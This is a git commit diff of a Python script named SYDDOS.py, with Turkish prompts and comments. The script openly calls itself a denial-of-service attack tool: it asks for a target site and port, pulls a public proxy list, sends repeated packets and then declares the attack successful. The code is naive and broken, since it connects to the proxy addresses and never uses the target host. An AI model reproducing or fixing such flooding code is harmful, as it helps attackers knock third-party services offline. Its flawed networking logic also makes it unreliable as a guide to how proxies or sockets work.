e296ae4bc4a94595c49d5bbbcf07d2ce067caa2b
TheSyrox <80204080+TheSyrox@users.noreply.github.com>
2023-01-19 10:08:00 +0300

    Update SYDDOS.py

--- SYDDOS.py
+++ SYDDOS.py
@@ -1,35 +1,34 @@
 import socket
 import time
+import requests
 
-def send_packets(host, port, packet_count):
-    # Socket oluştur
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    start_time = time.time()
-    # Bağlantıyı yap
-    s.connect((host, port))
-    end_time = time.time()
-    connection_time = end_time - start_time
-    
-    start_time = time.time()
-    # Paketleri gönder
-    data = b'PAKET'* packet_count
-    s.sendall(data)
-    end_time = time.time()
-    sending_time = end_time - start_time
-    
-    print("PAKET SENDING: ", packet_count)
-    print("Bağlantı süresi: ", connection_time * 1000, "ms")
-    print("Gönderme süresi: ", sending_time * 1000, "ms")
-
-    # Bağlantıyı kapat
-    s.close()
+def send_packets(host, port, packet_count, proxy_list):
+    for proxy in proxy_list:
+        # Socket oluştur
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        # Proxy kullanmak için bağlantı yap
+        s.settimeout(10)
+        s.connect((proxy, port))
+        
+        # Paketleri gönder
+        data = b'PAKET'* packet_count
+        s.sendall(data)
+        
+        # Bağlantıyı kapat
+        s.close()
 
 host = input("Hedef website adresi: ")
 port = int(input("Hedef port numarası: "))
 packet_count = int(input("Gönderilecek paket sayısı: "))
 
-send_packets(host, port, packet_count)
-time.sleep(3)
+# Proxy listesini al
+proxy_list = []
+try:
+    response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http")
+    proxy_list = response.text.split('\r\n')
+except:
+    print("Proxy listesi alınamadı")
+
+send_packets(host, port, packet_count, proxy_list)
 print("Saldırı başarılı")
-time.sleep(99)
